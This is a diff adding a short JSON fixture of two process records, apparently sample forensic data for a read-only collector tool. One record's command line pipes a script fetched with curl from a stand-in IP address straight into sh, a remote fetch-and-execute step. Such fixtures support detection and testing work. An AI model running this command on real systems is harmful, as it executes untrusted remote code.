@@ -1,0 +1,15 @@
+[
+  {
+    "pid": 1410,
+    "user": "analyst",
+    "cmdline": "bash -c curl http://198.51.100.24:8081/p.sh | sh",
+    "start": "2026-04-29T08:12:03Z"
+  },
+  {
+    "pid": 1419,
+    "user": "root",
+    "cmdline": "/usr/bin/python3 /opt/protocol-sift/collector.py --read-only",
+    "start": "2026-04-29T08:14:10Z"
+  }
+]
+
